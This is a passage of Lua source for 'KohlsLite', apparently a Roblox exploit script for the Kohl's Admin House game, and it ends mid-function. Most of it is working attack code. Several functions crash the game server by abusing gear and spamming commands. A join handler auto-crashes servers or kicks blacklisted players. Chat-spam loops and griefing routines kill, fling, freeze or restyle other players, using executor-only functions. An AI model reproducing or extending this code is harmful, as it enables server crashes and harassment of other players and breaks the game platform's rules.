StopEvent = Instance.new("BindableEvent")

function Playlist(shazam)
        local Params = Instance.new("AudioSearchParams")
        Params.SearchKeyword = shazam
        Params.AudioSubType = Enum.AudioSubType.Music
        Params.MinDuration = 60
        
        local returnables = {}
        
        local audioPage = game:GetService("AssetService"):SearchAudio(Params)
        
        repeat task.wait()
            for _,audioTable in pairs(audioPage:GetCurrentPage()) do
                task.spawn(function()
                    returnables[#returnables + 1] = {
                        Id = audioTable.Id,
                        Duration = audioTable.Duration, 
                        Title = audioTable.Title
                    }
                end)
            end
            audioPage:AdvanceToNextPageAsync()
        until
            audioPage.IsFinished
        
        local musicstop = false

        local con
        con = StopEvent.Event:Connect(function()
            musicstop = true
            SkipEvent:Fire()
        end)

        Chat("h \n\n\n\n \n\n\n\n [KohlsLite]: Found " .. #returnables .. " songs. \n\n\n\n")

        for _,v in pairs(returnables) do
            if musicstop then break end
            local musicskip = false
            Chat("music " .. v.Id)
            Chat("h \n\n\n [KohlsLite]: Now playing: " .. v.Title .. " (" .. v.Duration .. "s) \n\n\n")
            
            local conn
            conn = SkipEvent.Event:Connect(function()
                musicskip = true
                conn:Disconnect()
            end)

            task.delay(v.Duration, function()
                musicskip = true
            end)

            repeat task.wait() until musicskip
            Chat("music 0") 
        end
end

-- GOTO REGEN
function regentp()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame
end

-- VG CRASH
function VGCrash()
      Chat("gear me 00000000000000094794847")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
      local vg = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
      vg.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      vg:Activate()
      wait(.15)
      for i = 1,100 do
          Chat("unsize me me me")
      end
end

function CoCrash()
    Chat("gear me 94794847")
    repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher").Parent = game.Players.LocalPlayer.Character
    repeat task.wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    repeat task.wait() until game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Remote")
    game.Players.LocalPlayer.Character.VampireVanquisher.Remote:FireServer(Enum.KeyCode.Q)
    for i = 1, 5 do
        game.Players:Chat("unsize me")
    end
end

function EmCrash()
      Chat("gear me 000000000000000178076749")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("Emerald Knights of the Seventh Sanctum Sword and Shield")
      local green = game.Players.LocalPlayer.Backpack:FindFirstChild("Emerald Knights of the Seventh Sanctum Sword and Shield")
      green.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      green:Activate()
      wait(.15)
      for i = 1,100 do
          Chat("dog me me me")
          Chat("clone me me me")
      end
end

function PCrash() -- with this crash make sure to click manually
	for i = 1, 2 do
              Chat("gear me 0000000092628079")
              repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("OrinthianSwordAndShield")
              local ort = game.Players.LocalPlayer.Backpack:FindFirstChild("OrinthianSwordAndShield")
              ort.Parent = game.Players.LocalPlayer.Character
              task.wait(0.2)
              ort:Activate()
              task.wait(.15)
              for i = 1,100 do
                  Chat("unsize me me me")
              end
	end
end

-- WELCOME/LEAVE MSG
function onPlayerAdded(player)
    task.wait(0)
     PLRSTART(player)
    if welcomemsg == true and (player.Name ~= "ScriptingProgrammer" and player.Name ~= "me_123eq") then
        if table.find(whitelist, player.Name) then
         	Chat("h \n\n\n [KohlsLite]: Welcome to the server, " .. player.Name .. ". You are whitelisted from serverlocks! \n\n\n")
	elseif table.find(FAdmins, player.Name) then
	         Chat("h \n\n\n [KohlsLite]: Welcome to the server, " .. player.Name .. ". You have been given free admin! \n\n\n")
	elseif alladmin then
	         Chat("h \n\n\n [KohlsLite]: Welcome to the server, " .. player.Name .. ". This server has free admin! \n\n\n")
	else
	         Chat("h \n\n\n [KohlsLite]: Welcome to the server, " .. player.Name .. ". \n\n\n")
	end
        print(player.Name.." joined the server.")
        Remind(player.Name.." joined the server.")
    end 

    if autogpcheck == true then
          gcplr = player
          gcplrn = player.Name
          checkforpersons()
          checkforperm()
    end

    if (player.Name == "ScriptingProgrammer" or player.Name == "me_123eq") and player.Name ~= game.Players.LocalPlayer then
         Chat("h \n\n\n [KohlsLite]: SkiddingProgrammer [OWNER OF KL] joined the server! \n\n\n")
         print("SkiddingProgrammer [OWNER OF KL] joined the server!")
    end

    if (player.Name == "atprog" or player.Name == "IceStuds") and player.Name ~= game.Players.LocalPlayer then
        Chat("h \n\n\n [KohlsLite]: atprog [OWNER OF PR] joined the server! \n\n\n")
        print("atprog [OWNER OF PR] joined the server!")
       end

    if (player.Name == "t_echr" or player.Name == "t_echl") and player.Name ~= game.Players.LocalPlayer then
        Chat("h \n\n\n [KohlsLite]: Tech [OWNER OF SCV3-VAR] joined the server! \n\n\n")
        print("Tech [OWNER OF SCV3-VAR] joined the server!")
    end

    if (player.Name == "dawninja21" or player.Name == "Dawninja21alt") and player.Name ~= game.Players.LocalPlayer then
        Chat("h \n\n\n [KohlsLite]: DarkSpieces [OWNER OF HYDRA!] joined the server! \n\n\n")
        print("dawninja21 [OWNER OF HYDRA!] joined the server!")
    end

    if player.AccountAge < newlen == true and newplrautoslock == true then
         Chat("h \n\n\n [KohlsLite]: Automatically banned "..player.Name.." for being on an account under the account age limit. \n\n\n")
         print(player.Name.." joined the server. They were auto-banned for being under the account age limit.")
         if not table.find(newplrslocked, player.Name) then
                 table.insert(newplrslocked, player.Name)
         end
    end

    if table.find(rkick_on_sight, player.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto rocket kicking "..player.Name.." as they are blacklisted. \n\n\n")
                srkick = true
                rkicks = player.Name
                rkicker = player
    end

    if table.find(suser_on_sight, player.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto slowing "..player.Name.." as they are blacklisted. \n\n\n")
                table.insert(carcar, player.Name)
    end

    if table.find(mkick_on_sight, player.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto message kicking "..player.Name.." as they are blacklisted. \n\n\n")
                antichatplr = true
                acplr = player.Name
    end

    if table.find(furry_on_sight, player.Name) then
                Chat(prefix.."char "..player.Name.." furry")
    end

    if table.find(crash_on_sight, player.Name) then
        Chat("h \n\n\n [KohlsLite]: Server automatically crashed due to blacklisted user ("..player.Name..") joining. \n\n\n")
        print(player.Name.." joined the server. Server was automatically crashed as they are blacklisted.")
        DCrash()  
    end

    if autogb == true then 
                xplr = player
                xplayer = player.Name
                print(xplr);print(xplayer)
                Gearban()
    end
    task.wait()
end

function onPlayerLeaving(player)
    task.wait(0)
    if welcomemsg == true then
             Chat("h \n\n\n [KohlsLite]: Goodbye, " .. player.Name .. ". \n\n\n")
         print(player.Name.." left the server.")
         Remind(player.Name.." left the server.")
    end

    if table.find(rkick_on_sight, player.Name) then
                srkick = false
    end

    if table.find(suser_on_sight, player.Name) then
                table.remove(carcar, table.find(carcar, player))
    end

    if table.find(carcar, player.Name) then
                table.remove(carcar, table.find(carcar, player))
    end

    if table.find(byecam, player.Name) then
                table.remove(byecam, table.find(byecam, player))
    end

    if acplr == player.Name then
                antichatplr = false
    end

    if table.find(mkick_on_sight, player.Name) then
                antichatplr = false
    end

    task.wait()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerLeaving)

-- SUPER COMMAND
function SuperCMD(supermessage)
        for i = 1,amon do
                 Chat(supermessage)
                 task.wait()
        end
end

-- SPAM
task.spawn(function()
        while true do
                task.wait(0)
                if spam == true and spamon == true then
                            Chat(spamtext)
                            task.wait(spamwait)
                end
        end
end)


-- AUTOAFK
local UserInputService = game:GetService("UserInputService")

UserInputService.WindowFocusReleased:Connect(function()
        task.wait(0)
            if autoafk == true then
                    Chat("name me ["..game.Players.LocalPlayer.Name.."]: AFK")
                    Chat("ff me")
                    Chat("god me")
            end
end)

UserInputService.WindowFocused:Connect(function()
        task.wait(0)
            if autoafk == true then
                Chat("reset me")
                Chat("unff me")
                Chat("ungod me")
            end
end)

-- CLICK
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
        pcall(function()
                local plr = mouse.Target.Parent.Parent
                for i, v in pairs(game.Players:GetPlayers()) do
                    pcall(function()
                            if mouse.Target.Parent:FindFirstChild("Humanoid") then
                                plr = mouse.Target.Parent
                            end
                        end)
                end
                if plr ~= nil then
                    if clickexplode then
                            Chat("explode "..plr.Name)
                    end
                end
        end)
end)

-- REGEN
function Regen()
        if fireclickdetector then
                     fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
        end
end

-- regen auto
task.spawn(function()
     while true do
           task.wait(0)
           if SRegen == true then
                for i,v in pairs(game.Players:GetChildren()) do
                                for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                        if pad.Name == v.Name.."'s admin" then
                                               Regen()
                                        end
                                end
                end
           end
     end
end)

-- FASTPADS
function FastPads() -- if no touchinterest or idk
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-36.7649803, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-24.764967, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20.7649632, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16.7649612, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-44.7649994, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-32.7649765, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-40.7649879, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.7649689, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               House()
end

-- GEARBAN
function Gearban()
        Chat("gear me 82357101")
        Chat("unff all")
        Chat("speed " ..xplayer.. " 0")
           local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = xplr.Character.HumanoidRootPart.CFrame
        local cappy = xplr.Character
        repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("PortableJustice")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        tool.MouseClick:FireServer(cappy)
        task.wait(1)                         
        tool:Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        Chat("ungear me")
end

-- Paint map
function PaintMap(colourhere,mode)
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
		task.spawn(function()
			if v:IsA("Part") then
				if mode == "norm" then
					local Partse =
					{
						["Part"] = v,
						["Color"] = colorAPI.transformToColor3(BrickColor.new(colourhere))
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				else
					local Partse =
					{
						["Part"] = v,
						["Color"] = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end
		end)
	end
	task.wait(1)
	Chat("ungear me");Chat("unpaint all")
end

function PaintMap_2(r,g,b)
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
		task.spawn(function()
			if v:IsA("Part") then
					local Partse =
					{
						["Part"] = v,
						["Color"] = Color3.fromRGB(r,g,b)
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
			end
		end)
	end
	task.wait(1)
	Chat("ungear me");Chat("unpaint all")
end

-- Fix paint
function FixPaint()
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	coroutine.wrap(function()
			colorAPI.colorHouse({
				wallsC = colorAPI.transformToColor3(BrickColor.new("Brick yellow")),
				baseC = colorAPI.transformToColor3(BrickColor.new("Bright green")),
				roofC = colorAPI.transformToColor3(BrickColor.new("Bright red")),
				WANDDC = colorAPI.transformToColor3(BrickColor.new("Dark orange")),
				stairsC = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
				floorC = colorAPI.transformToColor3(BrickColor.new("Medium blue")),
				rooftsC = colorAPI.transformToColor3(BrickColor.new("Reddish brown")),
				chiC = colorAPI.transformToColor3(BrickColor.new("Sand red"))
			})
	end)()

    	spawn(function()
			colorAPI.colorBuildingBricks({
				DarkStoneGrey = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
				DeepBlue = colorAPI.transformToColor3(BrickColor.new("Deep blue")),
				NY = colorAPI.transformToColor3(BrickColor.new("New Yeller")),
				IW = colorAPI.transformToColor3(BrickColor.new("Institutional white")),
				LimeGreen = colorAPI.transformToColor3(BrickColor.new("Lime green")),
				MSG = colorAPI.transformToColor3(BrickColor.new("Medium stone grey")),
				RB = colorAPI.transformToColor3(BrickColor.new("Really black")),
				TP = colorAPI.transformToColor3(BrickColor.new("Toothpaste")),
				RR = colorAPI.transformToColor3(BrickColor.new("Really red"))	
			})
	end)

	spawn(function()
		colorAPI.colorObbyBox(colorAPI.transformToColor3(BrickColor.new("Teal")))
	end)

	spawn(function()
		colorAPI.colorObbyBricks(colorAPI.transformToColor3(BrickColor.new("Bright red")))
	end)
		
	spawn(function()
		colorAPI.colorAdminDivs(colorAPI.transformToColor3(BrickColor.new("Dark stone grey")))
	end)

	spawn(function()
		colorAPI.colorPads(colorAPI.transformToColor3(BrickColor.new("Bright green")))
		
	end)

	if game.Workspace.Terrain["_Game"].Workspace["Baseplate"] then
		colorAPI.color(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], colorAPI.transformToColor3(BrickColor.new("Bright green")))
	end

	if game:GetService("Workspace").Terrain["_Game"].Admin.Regen then
		colorAPI.color(game:GetService("Workspace").Terrain["_Game"].Admin.Regen, colorAPI.transformToColor3(BrickColor.new("Bright violet")))
	end

	task.wait(1)
	Chat("ungear me")
end

function Lemon()
        Chat("gear me 19703476")
        Chat("unff "..lemonman)
        Chat("speed " ..lemonman.. " 0")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lman.Character.HumanoidRootPart.CFrame
        repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("YellowSnowball")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("YellowSnowball")
        tool.Parent = game.Players.LocalPlayer.Character
         Chat("music 132323614")
            task.wait(0.6)
            Speak("I'M THE MAN WHO'S GONNA BURN YOUR HOUSE DOWN!")
            task.wait(2.9)
            Speak("WITH THE LEMONS!")
            task.wait(0.6)
            Chat("explode me")
            task.wait(0.7)
        Chat("music nan")
end

function Welding(mode)
	Chat("speed "..welder.." 0")
        Chat("freeze "..welder)
        Chat("unfreeze "..welder)
        repeat wait() until wld.Character:FindFirstChild("ice")
        wld.Character.ice:Destroy()
        Chat("gear me 74385399")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        local Detonator = game.Players.LocalPlayer.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        Detonator.Parent = game.Players.LocalPlayer.Character
	if mode == "right arm" then
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,1.5)
	elseif mode == "left arm" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-2.5,0,1.5)
	elseif mode == "torso" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-1.5,0,1.5)
	elseif mode == "hold" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-0.5,0,1.5)
	else
		mode = "hold"
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-0.5,0,1.5)
	end
        wait(0.2)
        local Act = "Activate"
        local Pos = wld.Character.HumanoidRootPart.Position
        Detonator.RemoteEvent:FireServer(Act, Pos)
        wait(0.3)
	if mode == "hold" then
   		Detonator:Destroy()
    		Chat("ungear me");task.wait(0.1)
    	        Chat("gear me 22787248")
    	        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
        	local wat = game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
        	wat.Parent = game.Players.LocalPlayer.Character
	end
end

function HFreeze()
	local originalCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    	Chat("gear me 130113146")
	Chat("speed "..welder.." 0")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    	local gun = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    	gun.Parent = game.Players.LocalPlayer.Character
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.Head.CFrame * CFrame.new(-1,-1,4)
	wait(.3333)
	repeat wait() 
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.Head.CFrame * CFrame.new(-1,-1,4)
	spawn(function()
	    	local A_1 = "Click"
		local A_2 = true
		local A_3 = wld.Character.Head.Position
		gun.ServerControl:InvokeServer(A_1, A_2, A_3)
	end)
	until wld.Character.Head:FindFirstChildOfClass("SelectionBox")
	Chat("reset me")
	wait(0.25)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=originalCFrame
end

function TAttach()
	Chat("speed "..welder.." 0")
	Chat("setgrav "..welder.." 3500")
	Chat("freeze "..welder)
	Chat("unfreeze "..welder)
	repeat wait() until wld.Character:FindFirstChild("ice")
	wld.Character.ice:Destroy()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(1.5,0,0)
	wait(0.25)
	Chat("unpunish me");Chat("invis me")
end

function DumbGuy()
        Chat("speed "..dummy.." 0")
        Chat("music 131453190")
        wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = idum.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3) * CFrame.Angles(0,math.rad(180),0)
        Speak("Don't believe me?");task.wait(0.9)
        Speak("Here,");task.wait(0.6)
        Speak("I'll put you on.");task.wait(0.6)
        Chat("gear me 212641536")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba.Parent = game.Players.LocalPlayer.Character
        wait(1)
        boomba:Destroy()
        Speak("That's you!")
        Chat("/e point");task.wait(0.9)
        Speak("That's how dumb you sound!");task.wait(1)
        Chat("music nan")
        Chat("speed "..dummy.." 16")
end

function Laser()
            local goodbye = false
            local kahcon
            local kahcon2

            kahcon = workspace.ChildAdded:Connect(function(Child)
                if Child.Name == "Effect" then
                    task.spawn(function()
                        repeat task.wait() 
                            firetouchinterest(Child, laman.Character.HumanoidRootPart, 0)
                            firetouchinterest(Child, laman.Character.HumanoidRootPart, 1)
                        until Child.Parent ~= workspace or goodbye or not kahcon
                    end)
                end
            end)

            kahcon2 = laman.Character.HumanoidRootPart.ChildAdded:Connect(function(Child)
                if Child.Name == "SelectionBox" and not goodbye then
                    goodbye = true
                    Chat("punish " .. laserman)
                end
            end)

            Chat("gear me 130113146")
            repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
            local Laser = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
            local Server = Laser:WaitForChild("ServerControl")
            task.wait()
            Laser.Parent = game.Players.LocalPlayer.Character
            Server:InvokeServer("Click", true, laman.Character.HumanoidRootPart.Position)
            repeat task.wait() until goodbye
            kahcon:Disconnect()
            kahcon2:Disconnect()
end

function Rail()
        Chat("ff " ..railer)
        Chat("god " ..railer)
        Chat("spin " ..railer)
        SuperCMD("gear me 79446473")
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, x in ipairs(Backpack:GetChildren()) do
                x.Parent = game.Players.LocalPlayer.Character
                x:WaitForChild("Click"):FireServer(workspace[railer].Torso.Position)
        end
        task.wait(2)
        Chat("ungod " .. railer)
        Chat("unspin " .. railer)
        Chat("unff " .. railer)
        Chat("ungear me")
end

function Ungearban(plrg)
        Chat("ungear me")
        Chat("tp "..plrg.." me")
        Chat("speed "..plrg.." 0")
        task.wait(0.5)
        Chat('gear me 71037101')
        repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        ungear = game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        task.wait()
        ungear.Parent = game.Players.LocalPlayer.Character
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Character.Backpack:FindFirstChild("DaggerOfShatteredDimensions"))
        task.wait(0.5)
        game.Players.LocalPlayer.Character.DaggerOfShatteredDimensions.Remote:FireServer(Enum.KeyCode.Q)
        task.wait(0.5)
        Chat("ungear me")
        Chat("speed "..plrg.." 16")
end

function StoneMap()
        Chat("ungear me")
        task.wait(0.5)
         local stoneTool1, stoneTool2
        Chat('gear me 59190534')
        Chat('gear me 59190534')
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 2
        stoneTool1, stoneTool2 = game.Players.LocalPlayer.Backpack:GetChildren()[1], game.Players.LocalPlayer.Backpack:GetChildren()[2]
        task.wait()
        stoneTool1.Parent, stoneTool2.Parent = game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character
        task.wait()
        Remind("Wait around 10 seconds for the effect to be permanent")
        task.spawn(function()
            stoneTool1.ServerControl:InvokeServer("KeyPress", {["Key"] = "x", ["Down"] = true})
        end)
        task.spawn(function()
            stoneTool2.ServerControl:InvokeServer("KeyPress", {["Key"] = "x", ["Down"] = true})
        end)
end

-- By iidk!
function SpHammer()
        Remind("From ii's stupid admin!")
        Chat("gear me 10468797")
        local hammer = game.Players.LocalPlayer.Backpack:WaitForChild("BanHammer")
        local mode = "kill"

        local phrases = {"Missclick","Really","Oops","Why","That is a very bad sin","while true do end","LOLWUT","You have been spun"}

        
        game.Players.LocalPlayer.Chatted:Connect(function(msg)
                
	           if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'hmode' then
                                local args = string.split(msg, " ")
                                if #args == 2 then
                                        mode = args[2]
                                end
                   end
                
	           if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'hcmds' then       
                                 Remind("Check your console by doing /console in chat!")
                                 HCMDS()
                   end
        end)

        function HCMDS()

print("- Main -")
print("hcmds - print the commands")
print("hmode - set the mode")

print("- Mode -")
print("kill - used by default")
print("anchor - freezes the player")
print("unanchor - unfreezes the player")
print("nil - punishes player")
print("nan - sets size to nan")
print("smack - smacks the player (unequip hammer right after hitting someone with this enabled)")
print("spin - spins the player and plays music")
print("smite - paints player black and explodes them")
print("fling - flings the player")
print("label - gives them a random name")
print("furry - rawr")
print("fem - maid outfit")
print("color - paints the player a random color")
print("duck - quack quack")

print("- Script by iiDk, ported for KohlsLite. -")

        end
        
        hammer.Handle.Touched:Connect(function(p)
	        local sound = 10730819
	        if p.Parent == game.Players.LocalPlayer.Character then return end
	        if not p.Parent:FindFirstChild("Humanoid") then return end
	        if #p.Parent.Name:split(" ")>1 then return end
                
	        if mode == "kill" then
		        Chat("kill "..p.Parent.Name)
	        end
                
	        if mode == "unanchor" then
		        sound = 12221990
		        Chat("unfreeze "..p.Parent.Name)
	        end
                
	        if mode == "anchor" then
		        sound = 12222152
		        Chat("freeze "..p.Parent.Name)
	        end
                
	        if mode == "nil" then
		        if p.Name ~= "Base" then
			        sound = 4676738150
			        Chat("punish "..p.Parent.Name)
		        end
	        end
                
	        if mode == "nan" then
		        if p.Name ~= "Base" then
			        sound = 135361652
			        Chat("size "..p.Parent.Name.." nan")
		        end
	        end
                
	        if mode == "smack" then
		        if p.Name ~= "Base" then
			        sound = 5886215922
			        game.Players:Chat("speed "..p.Parent.Name.." 0")
			        game.Players:Chat("tp "..p.Parent.Name.." me")
			        spawn(function()
			            wait(0.8)
			            Chat("/e point")
			            wait(0.1)
			            Chat("fling "..p.Parent.Name)
			        end)
		        end
	        end
                
	        if mode == "spin" then
	                sound = 1846368080
		        Chat("music 1846368080")
		        Chat("spin "..p.Parent.Name)
		        Chat("speed "..p.Parent.Name.." 0")
	        end
                
	        if mode == "smite" then
		        sound = 12222030
		        Chat("ff me")
		        Chat("explode "..p.Parent.Name)
		        Chat("kill "..p.Parent.Name)
		        Chat("paint "..p.Parent.Name.." Really black")
		        spawn(function()
		            wait(1)
		            Chat("unff me")
		        end)
	        end
                
	        if mode == "fling" then
		        sound = 12222046
		        Chat("fling "..p.Parent.Name)
	        end
                
	        if mode == "label" then
		        sound = 12222140
		        Chat("name "..p.Parent.Name.." "..phrases[math.random(1,#phrases)])
	        end
                
	        if mode == "furry" then
	            sound = 4821245570
	            spawn(function()
	                v = game.Players[p.Parent.Name]
                        Chat("char "..v.Name.." 18")
                        wait(0.5)
                        Chat("paint "..v.Name.." Institutional white")
                        wait()
                        Chat("hat "..v.Name.." 10563319994")
                        wait()
                        Chat("hat "..v.Name.." 12578728695")
                        wait()
                        Chat("shirt "..v.Name.." 10571467676")
                        wait()
                        Chat("pants "..v.Name.." 10571468508")
                        wait()
                        Chat("tp "..v.Name.." me")
                    end)
	        end
                
	        if mode == "fem" then
	            sound = 5064301214
	            spawn(function()
	                game.Players:Chat("char "..p.Parent.Name.." 31342830")
	                v = game.Players[p.Parent.Name]
                        repeat wait() until v and v.Character and v.Character:FindFirstChild("Ultra-Fabulous Hair")
                        wait(0.3)
                        Chat("removehats "..p.Parent.Name)
                        wait()
                        Chat("paint "..p.Parent.Name.." Institutional white")
                        wait()
                        Chat("hat "..p.Parent.Name.." 7141674388")
                        wait()
                        Chat("hat "..p.Parent.Name.." 7033871971")
                        wait()
                        Chat("shirt "..p.Parent.Name.." 5933990311")
                        wait()
                        Chat("pants "..p.Parent.Name.." 7219538593")
                        wait()
                        Chat("tp "..v.Name.." me")
                    end)
	        end
                
	        if mode == "color" then
		        Chat("paint "..p.Parent.name.." "..BrickColor.Random().Name)
	        end
                
	        if mode == "duck" then
		        Chat("invisible "..p.Parent.Name)
		        Chat("hat "..p.Parent.Name.." 6532336503")
		        Chat("spin "..p.Parent.Name)
		        Chat("speed "..p.Parent.Name.." 0")
	        end
                
	        if mode == "color" then
		        Chat("music 11900833")
	        else
		        Chat("music "..tostring(sound))
	        end
                
	        repeat wait()  until game:GetService("Workspace").Terrain["_Game"].Folder.Sound.IsLoaded
	        spawn(function()
	            wait(game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength)
	            Chat("music nan")
	        end)
        end)
end

Loops = {}
Loops.rainbowmap = false
Loops.rbase = false
Loops.rfog = false
Loops.rkick = false

function PCheck()
		t = false
       		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Backpack then
			if game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") then
				t = true
			elseif game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
				paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   				paint.Parent = game.Players.LocalPlayer.Character
				Chat(prefix.."rpaintui")
				t = true
			else
				Chat(prefix.."gear me painter")
				repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    				paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   				paint.Parent = game.Players.LocalPlayer.Character
				Chat(prefix.."rpaintui")
				t = true
			end
		end
end

function rmap()

		local RainbowValue = 0
		Loops.rainbowmap = true
    		repeat task.wait()
        			RainbowValue = RainbowValue + 1/50
    			        if RainbowValue >= 1 then
